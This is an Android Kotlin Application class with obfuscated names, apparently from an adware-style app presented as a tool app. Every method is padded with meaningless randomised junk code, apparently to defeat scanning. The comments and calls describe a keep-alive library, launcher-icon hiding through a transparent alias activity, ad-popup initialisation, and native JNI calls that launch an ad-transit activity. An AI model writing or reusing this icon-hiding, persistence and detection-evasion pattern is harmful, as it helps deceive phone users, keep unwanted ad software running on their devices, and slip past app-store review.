package rid.jdi.bbwq

import android.app.Application
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.core.content.ContextCompat.startActivity
import rid.jdi.bbwq.tools.ToolUiInstaller
import com.keep.up.all.NativeJniUtils
import rid.lmw.iwbk.base.APPContext
import rid.lmw.iwbk.base.BaseApplication
import rid.lmw.iwbk.base.OverseaAppHost
import rid.lmw.iwbk.base.OverseaAppInitializer
import rid.lmw.iwbk.ad.runtime.AdLifecycleInstaller


class GGR : Application(), OverseaAppHost {

    override val restrictSubProcessInAttach: Boolean = true

    companion object {
        @JvmStatic
        var insApp: GGR? = null
    }

    override fun onCreate() {
           val PFGLvlJluhYNBiTkD : Any = if (kotlin.random.Random.nextBoolean()) 8 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val csvJBTTtj  = (PFGLvlJluhYNBiTkD  as? String)?.reversed() ?: "zCtSRQrRJEpXHClblW_147925451"

        if (csvJBTTtj  == "sWwLkr") {
            java.lang.System.out.print(csvJBTTtj )
        }
        // 先触发 BaseJksApplication(保活 aar)的 onCreate，再做海外公共初始化
        super.onCreate()
        insApp = this
        // 触发海外公共初始化(归因/广告/跳转/生命周期监听)，host 即自身
        OverseaAppInitializer.init(this, this)
        // 统一安装广告生命周期监听，内部带幂等保护
        AdLifecycleInstaller.install(this)
        // 保证白包有 context
        APPContext.setApplication(this)
        // 统一安装各工具页的自定义 UI(按 ToolType 区分;未注册的工具用功能层默认 UI)
        ToolUiInstaller.installAll()
    }

    // ApplicationListener.openLaunch —— 原由 BaseApplication 提供，切到 BaseJksApplication 后由自身实现：转调 openLaunchByOther
    override fun openLaunch(intent: Intent?) {
           val TIxaNQLwUoVQMqcYhSJ : Any = if (kotlin.random.Random.nextBoolean()) 76 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val aicUPZ  = (TIxaNQLwUoVQMqcYhSJ  as? String)?.reversed() ?: "cfyvsYZnu_-996402812"

        if (aicUPZ  == "ButhWTXZPrqVm") {
            java.lang.System.out.print(aicUPZ )
        }
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
        val xXcbOxkukurwMDhUvSw : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val cChDC  = xXcbOxkukurwMDhUvSw ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_35" 
            }
            if (cChDC .startsWith("rRxUDPfxwSgxC ")) {
                android.util.Log.v("TAG", cChDC )
            }
        PEZQ.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        val arr_tObvLvNtkeBqp  = listOf("KXbYlAOZqZ", "LIsxVBuOWfUylY", "TjsSDiAkQEuMPIde").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_SCqXUtRbBZRJI  = arr_tObvLvNtkeBqp .filter { it.length > 20 }
         if (ad_SCqXUtRbBZRJI .isNotEmpty() && java.lang.System.currentTimeMillis() < 38) {
             ad_SCqXUtRbBZRJI .forEach { _ ->  }
         }
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        NativeJniUtils.pageopen(intent)
    }


    override fun initPopPower() {
        val arr_fPzxVDLpRBNFCjq = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_SBTvbcFXcHluASx  = (arr_fPzxVDLpRBNFCjq  shl 36) xor (arr_fPzxVDLpRBNFCjq  shr 36)
         val j_jDlKKMoxhGiYxLg  = i_SBTvbcFXcHluASx .inv() and 0xFFFF
         if (j_jDlKKMoxhGiYxLg  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_zexjGLVol")
         }
        // 启动图标隐藏：禁用 PEXW 主入口，启用透明 MysteryAliasActivity
        startActivity(Intent(this, PEXX::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })

    }


    override fun initKeepPower(app: Application) {
        val TpqPFPDuyLC : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val vThllDk  = TpqPFPDuyLC ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_22" 
            }
            if (vThllDk .startsWith("DhWlHVIOuFBTsMdKEr ")) {
                android.util.Log.v("TAG", vThllDk )
            }
        NativeJniUtils.virinit(insApp)
    }

}